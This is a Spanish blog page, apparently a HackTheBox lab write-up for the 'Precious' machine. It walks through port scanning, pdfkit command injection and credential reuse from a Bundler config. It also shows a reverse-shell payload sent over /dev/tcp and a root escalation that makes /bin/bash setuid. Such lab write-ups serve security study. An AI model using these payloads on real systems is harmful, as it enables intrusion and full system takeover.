@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Resolución de la Máquina Precious de HackTheBox.'>
+<title>Write Up Precious</title>
+
+<link rel='canonical' href='https://sx1v4n.github.io/p/precious-htb/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Write Up Precious'>
+<meta property='og:description' content='Resolución de la Máquina Precious de HackTheBox.'>
+<meta property='og:url' content='https://sx1v4n.github.io/p/precious-htb/'>
+<meta property='og:site_name' content='S.x1v4n'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-03-04T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-03-04T00:00:00&#43;00:00'/><meta property='og:image' content='https://sx1v4n.github.io/p/precious-htb/logo.png' />
+<meta name="twitter:title" content="Write Up Precious">
+<meta name="twitter:description" content="Resolución de la Máquina Precious de HackTheBox."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://sx1v4n.github.io/p/precious-htb/logo.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/logo_hude82ea7f464a850aa72eb63e992f12f3_89784_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">S.x1v4n</a></h1>
+            <h2 class="site-description">Jr Penetration Tester / eJPTv2</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sx1v4n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0"?><svg fill="#FFFFFF" xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 50 50" width="50px" height="50px">    <path d="M17.791,46.836C18.502,46.53,19,45.823,19,45v-5.4c0-0.197,0.016-0.402,0.041-0.61C19.027,38.994,19.014,38.997,19,39 c0,0-3,0-3.6,0c-1.5,0-2.8-0.6-3.4-1.8c-0.7-1.3-1-3.5-2.8-4.7C8.9,32.3,9.1,32,9.7,32c0.6,0.1,1.9,0.9,2.7,2c0.9,1.1,1.8,2,3.4,2 c2.487,0,3.82-0.125,4.622-0.555C21.356,34.056,22.649,33,24,33v-0.025c-5.668-0.182-9.289-2.066-10.975-4.975 c-3.665,0.042-6.856,0.405-8.677,0.707c-0.058-0.327-0.108-0.656-0.151-0.987c1.797-0.296,4.843-0.647,8.345-0.714 c-0.112-0.276-0.209-0.559-0.291-0.849c-3.511-0.178-6.541-0.039-8.187,0.097c-0.02-0.332-0.047-0.663-0.051-0.999 c1.649-0.135,4.597-0.27,8.018-0.111c-0.079-0.5-0.13-1.011-0.13-1.543c0-1.7,0.6-3.5,1.7-5c-0.5-1.7-1.2-5.3,0.2-6.6 c2.7,0,4.6,1.3,5.5,2.1C21,13.4,22.9,13,25,13s4,0.4,5.6,1.1c0.9-0.8,2.8-2.1,5.5-2.1c1.5,1.4,0.7,5,0.2,6.6c1.1,1.5,1.7,3.2,1.6,5 c0,0.484-0.045,0.951-0.11,1.409c3.499-0.172,6.527-0.034,8.204,0.102c-0.002,0.337-0.033,0.666-0.051,0.999 c-1.671-0.138-4.775-0.28-8.359-0.089c-0.089,0.336-0.197,0.663-0.325,0.98c3.546,0.046,6.665,0.389,8.548,0.689 c-0.043,0.332-0.093,0.661-0.151,0.987c-1.912-0.306-5.171-0.664-8.879-0.682C35.112,30.873,31.557,32.75,26,32.969V33 c2.6,0,5,3.9,5,6.6V45c0,0.823,0.498,1.53,1.209,1.836C41.37,43.804,48,35.164,48,25C48,12.318,37.683,2,25,2S2,12.318,2,25 C2,35.164,8.63,43.804,17.791,46.836z"/></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/ivan-romero-capita-a56838256/'
+                        target="_blank"
+                        title="Linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="48px" height="48px"><path fill="#0288D1" d="M42,37c0,2.762-2.238,5-5,5H11c-2.761,0-5-2.238-5-5V11c0-2.762,2.239-5,5-5h26c2.762,0,5,2.238,5,5V37z"/><path fill="#FFF" d="M12 19H17V36H12zM14.485 17h-.028C12.965 17 12 15.888 12 14.499 12 13.08 12.995 12 14.514 12c1.521 0 2.458 1.08 2.486 2.499C17 15.887 16.035 17 14.485 17zM36 36h-5v-9.099c0-2.198-1.225-3.698-3.192-3.698-1.501 0-2.313 1.012-2.707 1.99C24.957 25.543 25 26.511 25 27v9h-5V19h5v2.616C25.721 20.5 26.85 19 29.738 19c3.578 0 6.261 2.25 6.261 7.274L36 36 36 36z"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Inicio</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/writeups/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewBox="0 0 512 512"><path d="M336 64h32a48 48 0 0148 48v320a48 48 0 01-48 48H144a48 48 0 01-48-48V112a48 48 0 0148-48h32" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="32"/><rect x="176" y="32" width="160" height="64" rx="26.13" ry="26.13" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="32"/></svg>
+                
+                <span>WriteUps</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/whoami/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewBox="0 0 512 512"><path d="M344 144c-3.92 52.87-44 96-88 96s-84.15-43.12-88-96c-4-55 35-96 88-96s92 42 88 96z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"/><path d="M256 304c-87 0-175.3 48-191.64 138.6C62.39 453.52 68.57 464 80 464h352c11.44 0 17.62-10.48 15.65-21.4C431.3 352 343 304 256 304z" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"/></svg>
+                
+                <span>Whoami</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archivos/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archivo</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/precious-htb/">
+                <img src="/p/precious-htb/logo.png"
+                        
+                        width="1000" 
+                        height="667" 
+                        loading="lazy"
+                        alt="Featured image of post Write Up Precious" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" style="background-color: #36e62e; color: #fff;">
+                HackTheBox
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/precious-htb/">Write Up Precious</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Resolución de la Máquina Precious de HackTheBox.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 04, 2023</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Empezamos escaneando los puertos.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sS --min-rate <span class="m">5000</span> -p- -n -vvv 10.10.11.189                  
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-03-03 22:33 CET
+</span></span><span class="line"><span class="cl">Initiating Ping Scan at 22:33
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.189 <span class="o">[</span><span class="m">4</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Completed Ping Scan at 22:33, 0.07s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Initiating SYN Stealth Scan at 22:33
+</span></span><span class="line"><span class="cl">Scanning 10.10.11.189 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Discovered open port 22/tcp on 10.10.11.189
+</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.10.11.189
+</span></span><span class="line"><span class="cl">Completed SYN Stealth Scan at 22:33, 11.43s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.189
+</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.11s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Scanned at 2023-03-03 22:33:13 CET <span class="k">for</span> 11s
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE REASON
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Realizamos virtual hosting.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo nano /etc/hosts
+</span></span><span class="line"><span class="cl">&lt;ip&gt;   &lt;domain_name&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Podemos crear un servidor local y poniendo nuestra ip para ver si nos lista el directorio.</p>
+<p><img src="/p/precious-htb/1.png"
+	width="1797"
+	height="477"
+	srcset="/p/precious-htb/1_huc36114d701311768b30f772f1c8c5e4d_71856_480x0_resize_box_3.png 480w, /p/precious-htb/1_huc36114d701311768b30f772f1c8c5e4d_71856_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="376"
+		data-flex-basis="904px"
+	
+></p>
+<p>Efectivamente nos muestra el directorio.</p>
+<p><img src="/p/precious-htb/2.png"
+	width="962"
+	height="262"
+	srcset="/p/precious-htb/2_hu6f3e4612f2ad50f749b0e7509680d3b2_63442_480x0_resize_box_3.png 480w, /p/precious-htb/2_hu6f3e4612f2ad50f749b0e7509680d3b2_63442_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="367"
+		data-flex-basis="881px"
+	
+></p>
+<p>Haremos un exiftool para obtener mas datos.</p>
+<p>Nos fijamos en la versión, podemos ver si existe algun exploit.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">exiftool okdyddataifm1fyahvphc6a58hczocv7.pdf                 
+</span></span><span class="line"><span class="cl">ExifTool Version Number         : 12.56
+</span></span><span class="line"><span class="cl">File Name                       : okdyddataifm1fyahvphc6a58hczocv7.pdf
+</span></span><span class="line"><span class="cl">Directory                       : .
+</span></span><span class="line"><span class="cl">File Size                       : <span class="m">33</span> kB
+</span></span><span class="line"><span class="cl">File Modification Date/Time     : 2023:03:03 22:45:19+01:00
+</span></span><span class="line"><span class="cl">File Access Date/Time           : 2023:03:03 22:45:19+01:00
+</span></span><span class="line"><span class="cl">File Inode Change Date/Time     : 2023:03:03 22:45:19+01:00
+</span></span><span class="line"><span class="cl">File Permissions                : -rw-r--r--
+</span></span><span class="line"><span class="cl">File Type                       : PDF
+</span></span><span class="line"><span class="cl">File Type Extension             : pdf
+</span></span><span class="line"><span class="cl">MIME Type                       : application/pdf
+</span></span><span class="line"><span class="cl">PDF Version                     : 1.4
+</span></span><span class="line"><span class="cl">Linearized                      : No
+</span></span><span class="line"><span class="cl">Page Count                      : <span class="m">1</span>
+</span></span><span class="line"><span class="cl">Creator                         : Generated by pdfkit v0.8.6
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Podemos mandarnos una reverse shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Comenzamos creando un servidor &gt;
+</span></span><span class="line"><span class="cl">python3 -m http.server <span class="m">9090</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">con un nc nos ponemos como escucha &gt;
+</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Reverse shell &gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://10.10.16.9:8080/?name<span class="o">=</span><span class="c1">#{&#39;%20`bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.16.9/9001 &lt;&amp;1&#39;`&#39;}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En el usuario &ldquo;ruby&rdquo; encontramos unas credenciales</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ruby@precious:~$ cd .bundle
+</span></span><span class="line"><span class="cl">cd .bundle
+</span></span><span class="line"><span class="cl">ruby@precious:~/.bundle$ cat config
+</span></span><span class="line"><span class="cl">cat config
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">BUNDLE_HTTPS://RUBYGEMS__ORG/: &#34;henry:Q3c1AqGHtoI0aXAYFH&#34;
+</span></span><span class="line"><span class="cl">ruby@precious:~/.bundle$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Por lo tanto podemos acceder por el ssh.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh henry@10.10.11.189 
+</span></span><span class="line"><span class="cl">henry@precious:~$ cat user.txt
+</span></span><span class="line"><span class="cl">*******************************
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>hacemos un sudo -l</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">henry@precious:/opt$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> henry on precious:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User henry may run the following commands on precious:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Vamos a ver el script de ruby.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">henry@precious:/opt$ cat update_dependencies.rb 
+</span></span><span class="line"><span class="cl"># Compare installed dependencies with those specified in &#34;dependencies.yml&#34;
+</span></span><span class="line"><span class="cl">require &#34;yaml&#34;
+</span></span><span class="line"><span class="cl">require &#39;rubygems&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># TODO: update versions automatically
+</span></span><span class="line"><span class="cl">def update_gems()
+</span></span><span class="line"><span class="cl">end
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def list_from_file
+</span></span><span class="line"><span class="cl">    YAML.load(File.read(&#34;dependencies.yml&#34;))
+</span></span><span class="line"><span class="cl">end
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def list_local_gems
+</span></span><span class="line"><span class="cl">    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
+</span></span><span class="line"><span class="cl">end
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gems_file = list_from_file
+</span></span><span class="line"><span class="cl">gems_local = list_local_gems
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gems_file.each do |file_name, file_version|
+</span></span><span class="line"><span class="cl">    gems_local.each do |local_name, local_version|
+</span></span><span class="line"><span class="cl">        if(file_name == local_name)
+</span></span><span class="line"><span class="cl">            if(file_version != local_version)
+</span></span><span class="line"><span class="cl">                puts &#34;Installed version differs from the one specified in file: &#34; + local_name
+</span></span><span class="line"><span class="cl">            else
+</span></span><span class="line"><span class="cl">                puts &#34;Installed version is equals to the one specified in file: &#34; + local_name
+</span></span><span class="line"><span class="cl">            end
+</span></span><span class="line"><span class="cl">        end
+</span></span><span class="line"><span class="cl">    end
+</span></span><span class="line"><span class="cl">end
+</span></span><span class="line"><span class="cl">henry@precious:/opt$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Vemos que lee el siguiente archivo -&gt; &ldquo;dependencies.yml&rdquo;.
+Primero ejecutamos el script.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">henry@precious:/opt$ sudo /usr/bin/ruby opt/update_dependencies.rb
+</span></span><span class="line"><span class="cl">[sudo] password for henry: 
+</span></span><span class="line"><span class="cl">Sorry, user henry is not allowed to execute &#39;/usr/bin/ruby opt/update_dependencies.rb&#39; as root on precious.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Por lo tanto vamos a ver si podemos editarlo.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git_set: chmod u+s /bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ls -al /bin/bash
+</span></span><span class="line"><span class="cl">bash -p
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> root <span class="o">&amp;&amp;</span> cat root.txt
+</span></span><span class="line"><span class="cl">****
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2023 S.x1v4n
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
